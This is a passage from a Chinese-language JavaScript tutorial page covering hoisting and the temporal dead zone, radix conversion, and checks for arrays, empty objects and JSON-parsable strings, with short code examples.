console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>函数声明提升</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: &quot;Hello&quot;</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Hello&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>函数声明整体被提升到作用域顶部。</p> <h4 id="_4-2-不同声明方式的预解析差异"><a href="#_4-2-不同声明方式的预解析差异" class="header-anchor">#</a> 4.2 不同声明方式的预解析差异</h4> <table><thead><tr><th style="text-align:center;">声明方式</th> <th style="text-align:center;">提升表现</th> <th style="text-align:center;">示例</th></tr></thead> <tbody><tr><td style="text-align:center;">var</td> <td style="text-align:center;">声明提升，值为undefined</td> <td style="text-align:center;">console.log(x); var x = 5;</td></tr> <tr><td style="text-align:center;">function</td> <td style="text-align:center;">整个函数体提升</td> <td style="text-align:center;">foo(); function foo() {}</td></tr> <tr><td style="text-align:center;">let/const</td> <td style="text-align:center;">提升但存在&quot;暂时性死区&quot;</td> <td style="text-align:center;">console.log(y); let y = 5; → 报错</td></tr> <tr><td style="text-align:center;">函数表达式</td> <td style="text-align:center;">按变量提升规则处理</td> <td style="text-align:center;">bar(); var bar = function() {} → 报错</td></tr></tbody></table> <h4 id="_4-3-预解析的优先级规则"><a href="#_4-3-预解析的优先级规则" class="header-anchor">#</a> 4.3 预解析的优先级规则</h4> <p>函数声明优先于变量声明</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: &quot;function&quot;</span>

<span class="token keyword">var</span> foo<span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>后面的函数声明会覆盖前面的</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: &quot;Second&quot;</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;First&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Second&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="_4-4-let-const-的暂时性死区-tdz"><a href="#_4-4-let-const-的暂时性死区-tdz" class="header-anchor">#</a> 4.4 let/const 的暂时性死区(TDZ)</h4> <p>虽然 <code>let</code> 和 <code>const</code> 也会被提升，但在声明前访问会报错：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ReferenceError: Cannot access 'b' before initialization</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="_4-5-实际开发中的注意事项"><a href="#_4-5-实际开发中的注意事项" class="header-anchor">#</a> 4.5 实际开发中的注意事项</h4> <ul><li><ol><li>避免先使用后声明：虽然预解析允许，但会降低代码可读性</li></ol></li> <li><ol start="2"><li>使用函数表达式时注意：</li></ol></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 这样会报错</span>
<span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">var</span> <span class="token function-variable function">myFunc</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 正确方式</span>
<span class="token keyword">var</span> <span class="token function-variable function">myFunc</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><ul><li><ol start="3"><li>推荐使用 let/const：避免 var 的提升问题</li></ol></li></ul> <h2 id="_35-十进制与其他进制的相互转换"><a href="#_35-十进制与其他进制的相互转换" class="header-anchor">#</a> 35. 十进制与其他进制的相互转换</h2> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 将十进制数转换成其他进制数</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换成2进制 1010</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换成8进制 12</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换成16进制 a</span>

<span class="token comment">// 将其他进制数转换成十进制数</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token string">&quot;10&quot;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将2进制的10转换成十进制 2</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将8进制的10转换成十进制 8</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将16进制的10转换成十进制 16</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="_36-判断变量方法归纳"><a href="#_36-判断变量方法归纳" class="header-anchor">#</a> 36. 判断变量方法归纳</h2> <h3 id="一-是否为数组"><a href="#一-是否为数组" class="header-anchor">#</a> 一. 是否为数组</h3> <h4 id="_1-array-isarray-推荐"><a href="#_1-array-isarray-推荐" class="header-anchor">#</a> 1. Array.isArray()（推荐）</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> notArr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>notArr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="_2-object-prototype-tostring-call-通用但繁琐-​"><a href="#_2-object-prototype-tostring-call-通用但繁琐-​" class="header-anchor">#</a> 2. Object.prototype.toString.call()（通用但繁琐）​</h4> <p>虽然 Array 也继承自 Object，但 js 在 Array.prototype 上重写了 toString，通过 toString.call(arr)实际上是通过原型链调用了。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'[object Array]'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="_3-使用-instanceof-有限制-​"><a href="#_3-使用-instanceof-有限制-​" class="header-anchor">#</a> 3. 使用 instanceof（有限制）​</h4> <p>适用于已知执行环境的情况，但在某些特殊场景下可能失效（例如跨 iframe 或窗口）。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>缺点​​：
<ul><li>如果变量来自不同的全局上下文（如另一个 iframe），instanceof 会返回 false。</li> <li>可能被原型链篡改干扰。</li></ul></li></ul> <h4 id="_4-构造函数的-constructor"><a href="#_4-构造函数的-constructor" class="header-anchor">#</a> 4. 构造函数的 constructor</h4> <p>Object 的每个实例都有构造函数 constructor，用于保存着用于创建当前对象的函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="_5-array-原型链上的-isprototypeof"><a href="#_5-array-原型链上的-isprototypeof" class="header-anchor">#</a> 5. Array 原型链上的 isPrototypeOf</h4> <p>Array.prototype 属性表示 Array 构造函数的原型<br>
其中有一个方法是 isPrototypeOf() 用于测试一个对象是否存在于另一个对象的原型链上。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">isPrototypeOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="_6-object-getprototypeof"><a href="#_6-object-getprototypeof" class="header-anchor">#</a> 6. Object.getPrototypeOf</h4> <p>Object.getPrototypeOf() 方法返回指定对象的原型</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="二-判断对象是否为空"><a href="#二-判断对象是否为空" class="header-anchor">#</a> 二. 判断对象是否为空</h3> <h4 id="_1-使用-object-keys-方法-推荐"><a href="#_1-使用-object-keys-方法-推荐" class="header-anchor">#</a> 1. 使用 Object.keys() 方法（推荐）</h4> <p><code>Object.keys()</code> 用于返回一个由对象自身的所有可枚举属性组成的数组</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 示例</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="_2-使用-json-stringify-方法"><a href="#_2-使用-json-stringify-方法" class="header-anchor">#</a> 2. 使用 JSON.stringify() 方法</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'{}'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 示例</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li>​注意​​：
<ul><li>性能略低于 Object.keys()</li> <li>会忽略不可枚举属性</li></ul></li></ul> <h4 id="_3-使用-for-in-循环"><a href="#_3-使用-for-in-循环" class="header-anchor">#</a> 3. 使用 for...in 循环</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 示例</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><ul><li>优点​​：
<ul><li>兼容性最好（包括旧版浏览器）</li> <li>可以检测继承的属性（如果需要）</li></ul></li></ul> <h4 id="_4-使用-object-getownpropertynames"><a href="#_4-使用-object-getownpropertynames" class="header-anchor">#</a> 4. 使用 Object.getOwnPropertyNames()</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 示例</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><ul><li>特点​​
<ul><li>含不可枚举属性</li></ul></li></ul> <h4 id="_5-使用-lodash-的-isempty"><a href="#_5-使用-lodash-的-isempty" class="header-anchor">#</a> 5. 使用 Lodash 的 _.isEmpty()</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> _ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>优点​​：
<ul><li>功能全面，可以处理各种边界情况</li> <li>适用于复杂对象判断</li></ul></li></ul> <h4 id="特殊情况处理"><a href="#特殊情况处理" class="header-anchor">#</a> 特殊情况处理</h4> <ol><li>检查 null 和 undefined</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ol start="2"><li>检查非对象类型</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isEmptyObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">!==</span> <span class="token string">'object'</span> <span class="token operator">||</span> obj <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 或者根据需求返回 true</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="三-判断字符串能否被-json-parse-成功解析"><a href="#三-判断字符串能否被-json-parse-成功解析" class="header-anchor">#</a> 三. 判断字符串能否被 JSON.parse() 成功解析</h3> <h4 id="_1-直接使用-try-catch-最可靠方法"><a href="#_1-直接使用-try-catch-最可靠方法" class="header-anchor">#</a> 1. 直接使用 try-catch（最可靠方法）</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">isJSONParsable</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 使用示例</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isJSONParsable</span><span class="token punctuation">(</span><span class="token string">'{&quot;a&quot;:1}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isJSONParsable</span><span class="token punctuation">(</span><span class="token string">'invalid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isJSONParsable</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// true (数字也是合法JSON)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">isJSONParsable</span><span class="token punctuation">(</span><span class="token string">'&quot;text&quot;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// true (字符串也是合法JSON)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><ul><li>优点​​：
<ul><li>100% 准确，与 JSON.parse 的行为完全一致</li> <li>能处理所有边缘情况</li></ul></li></ul></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">lastUpdate:</span> <span class="time">5/23/2025, 5:45:51 PM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/Front-end-go-on/pages/frontend/base/Css.html" class="prev">
        CSS基础
      </a></span> <span class="next"><a href="/Front-end-go-on/pages/frontend/base/ES6.html">
        ES6基础
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/Front-end-go-on/assets/js/app.fad555c1.js" defer></script><script src="/Front-end-go-on/assets/js/2.8f85e039.js" defer></script><script src="/Front-end-go-on/assets/js/5.092626d6.js" defer></script>
  </body>
</html>
